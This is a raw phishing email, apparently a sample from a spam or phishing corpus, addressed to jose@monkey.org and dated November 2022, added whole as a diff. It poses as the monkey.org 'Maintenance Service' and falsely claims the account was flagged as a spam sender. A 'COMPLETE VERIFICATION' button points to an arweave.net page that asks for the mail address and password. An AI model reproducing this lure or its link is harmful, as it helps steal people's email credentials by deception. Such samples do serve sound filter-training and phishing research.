@@ -1,0 +1,131 @@
+Return-Path: info@bustomshisoa.com
+Delivered-To: jose@monkey.org
+X-FDA: 80136534954.18.4871BD7
+Received: from slot0.bustomshisoa.com (unknown [45.139.105.16])
+	by imf23.b.hostedemail.com (Postfix) with ESMTP id B40DB10033EA7
+	for <jose@monkey.org>; Tue, 15 Nov 2022 18:37:36 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim;
+ d=bustomshisoa.com; =?utf-8?q?h=3DFrom=3ATo=3ASubject=3ADate=3AMessage-ID?=
+ =?utf-8?q?=3AMIME-Version=3AContent-Type=3AContent-Transfer-Encoding=3B?=
+ i=info@bustomshisoa.com; bh=vQ3RLO+C4Urq2HTphNgFa77YYew=; =?utf-8?q?b=3DFQC?=
+ =?utf-8?q?yuUSogYc7yb9CO5g0SOFxO7hCYSHGEk0OGQh6D72T98kGEfyFz1SUtGbUUjXgJFhR?=
+ =?utf-8?q?frhQFKpd?=  
+ sdefAlTzCjqTyt7mjsHGze66zO2/joVY3AEYc74MJY0TfQAyhnJmKuaoWyoJWWJGupdXdxtSYXdr
+  
+ Sb6koG7Xrrjb2bsfS0bzues3QklQnfgIdzxbC/kJ7a+urzctqiaWapZ4iy79Kb1EFMWgi0sLorYu
+  
+ KLShgrJinUeU4xz/p6iG7n0xOnTX3aTlQEnDLqo+LcpioXefs1AlNlFOajMZGjkW5emDGHt9hnvi
+   nNEhUuE+8klUHRl5zna8rooL8+eBcfZVHEHJNQ==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=bustomshisoa.com; 
+ =?utf-8?q?b=3DZY4nReRkDWfYNhxAqqwvQRskZbX2of8sniNMaST+qGNxYbUVPvzcWu2gsd40R?=
+ =?utf-8?q?Aa8viumP/yyc8Yy?=  
+ HdCHIq51xLw00n765t8wVFZtlktzCITpxv36nKGw5+9g9on8lQDNm2F89f7Rp5amJ9uRARY9w0o3
+  
+ tzmu4AGtehcGGTTL9gReKDugtQRV10QEqIrEe4tLckZIicDDIfNXKhgzhZQp6YIGLJ1CoIBSjZgS
+  
+ INB4hCtxS/aR1eTuRXmpiEgsB+O924IdPwTqY0e7iGsiSPCSKk2S+vcN/nwbXUDTS61Vabwdon3d
+   NHMfpJqWbj0sCUWd4YXuh7Ak/8RYkJHwImxebg==;
+From: Verify Now monkey.org  <info@bustomshisoa.com>
+To: jose@monkey.org
+Subject: Verify Urgently jose
+Date: 15 Nov 2022 20:37:42 +0200
+Message-ID: <20221115203741.FBD7F27623237218@bustomshisoa.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1668537456; a=rsa-sha256;
+	cv=none;
+	b=26E1dn9e0rhcMzrXn5XoLtj1qGrWw3EsVscPRt/sYsrMeUUX9eHxjMz0qTdHWQSDZpKLe1
+	4L7nfwx/1Ekq/RLa4lSwCbkb6itYjqStdDvdcZLbMoFv08bFiET+9hK5gC2ZX5tnz2qrUH
+	/JdJQ2Cqnq227HxdKeZ5YZTZhS+IcKc=
+ARC-Authentication-Results: i=1;	imf23.b.hostedemail.com;	dkim=pass
+ header.d=bustomshisoa.com header.s=dkim header.b=FQCyuUSo;	spf=pass
+ (imf23.b.hostedemail.com: domain of info@bustomshisoa.com designates
+ 45.139.105.16 as permitted sender) smtp.mailfrom=info@bustomshisoa.com;
+	dmarc=pass (policy=none) header.from=bustomshisoa.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1668537456;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=VioHX9UfcAQrakgFmxlMrtrh6k/5kBPX9xpUekjGkx4=;
+	b=EAVNqsXN1BDdk1MPX3k4GW2ZbZCfI86T3oJciegzfx2IMkJ/kaJ36Snw4GOKRGZBAlue1r
+	Z87XiC+iGeqt51Fms0Xzm7zRdqJxMArXpfX6C7F2jZkzB7JeI5BKLgTjac/ikNbeXLf1kV
+	/9QNq3QU4GaVI8/aF2KSTejS1ut86Qw=
+Authentication-Results: imf23.b.hostedemail.com;	dkim=pass
+ header.d=bustomshisoa.com header.s=dkim header.b=FQCyuUSo;	spf=pass
+ (imf23.b.hostedemail.com: domain of info@bustomshisoa.com designates
+ 45.139.105.16 as permitted sender) smtp.mailfrom=info@bustomshisoa.com;
+	dmarc=pass (policy=none) header.from=bustomshisoa.com
+X-Rspam-User: 
+X-Spam-Status: Yes, score=9.70
+X-Stat-Signature: 3f4rzj3zzj78kryx6w9kcjn38zzkk6pw
+X-Rspamd-Queue-Id: B40DB10033EA7
+X-Rspamd-Server: rspam07
+X-HE-Tag: 1668537456-411232
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 200
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P><BR class=3DApple-interchange-newline>
+<table style=3D"FONT-SIZE: small; FONT-FAMILY: gulim, arial; WHITE-SPACE: n=
+ormal; WORD-SPACING: 0px; TABLE-LAYOUT: fixed; TEXT-TRANSFORM: none; FONT-W=
+EIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2=
+; LETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps=
+: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initia=
+l; text-decoration-style: initial; text-decoration-color: initial" cellspac=
+ing=3D"0" cellpadding=3D"0" width=3D"85%" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"PADDING-TOP: 30px; MARGIN: 0px; LINE-HEIGHT: 1.666" valign=3D"=
+top" align=3D"center"><SPAN style=3D"VERTICAL-ALIGN: inherit"><SPAN style=
+=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT =
+style=3D"VERTICAL-ALIGN: inherit">Take Note :&nbsp;</FONT></FONT><BR><FONT =
+style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">&=
+nbsp;&nbsp; Your mail account jose@monkey.org has been flagged as a spam se=
+nder.&nbsp;</FONT></FONT></SPAN></SPAN>
+ &nbsp;monkey.org<FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VER=
+TICAL-ALIGN: inherit">&nbsp;<WBR>Maintenance&nbsp;Service 2022</FONT></FONT=
+></TD></TR>
+<TR>
+<td style=3D"PADDING-BOTTOM: 20px; PADDING-TOP: 20px; MARGIN: 0px; LINE-HEI=
+GHT: 1.666" valign=3D"top" align=3D"center"><BR></TD></TR>
+<TR>
+<td style=3D"PADDING-BOTTOM: 20px; MARGIN: 0px; LINE-HEIGHT: 1.666" align=
+=3D"center">
+<A style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 13px; FONT-FAMILY: inherit; =
+BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BACKGROUND-IMAGE: none; =
+BORDER-BOTTOM-WIDTH: 0px; BACKGROUND-REPEAT: repeat; TEXT-TRANSFORM: upperc=
+ase; COLOR: rgb(255,255,255); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADD=
+ING-LEFT: 30px; MARGIN: 0px 10px 0px 0px; DISPLAY: inline-block; PADDING-RI=
+GHT: 30px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(16,173,228); text-d=
+ecoration-line: none; border-radius: 20px;=20
+font-stretch: inherit; background-size: auto" href=3D"https://r7zw2ghyiiywj=
+udn7j7jgrzaeyrp5dmm7ojyzwy6opdeinbt37ta.arweave.net/j_NtGPhCMWTQbfp-k0cgJiL=
+-jYz7k4zbHnPGRDQz3-Y#jose@monkey.org" rel=3D"noopener noreferrer" target=3D=
+_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://r7zw2=
+ghyiiywjudn7j7jgrzaeyrp5dmm7ojyzwy6opdeinbt37ta.arweave.net/j_NtGPhCMWTQbfp=
+-k0cgJiL-jYz7k4zbHnPGRDQz3-Y%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;u=
+st=3D1668602333551000&amp;usg=3DAOvVaw36Yq0fs4qAthsu76UxEnv8">
+<SPAN style=3D"VERTICAL-ALIGN: inherit"><SPAN style=3D"VERTICAL-ALIGN: inhe=
+rit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN:=
+ inherit">COMPLETE VERIFICATION</FONT></FONT></SPAN></SPAN></A><BR><BR><FON=
+T style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"=
+>To keep your account from being suspended<BR>Please double-check your mail=
+ address and password to complete the verification process.<FONT size=3D3><=
+BR></FONT></FONT></FONT>&nbsp;<BR>
+monkey.org<FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-A=
+LIGN: inherit">&nbsp;&nbsp; &copy; 2022 All rights reserved<BR><FONT style=
+=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT =
+size=3D3>This service is provided without charge.&nbsp;</FONT></FONT></FONT=
+>&nbsp;<BR></FONT></FONT></TD></TR></TBODY></TABLE></P></BODY></HTML>
+
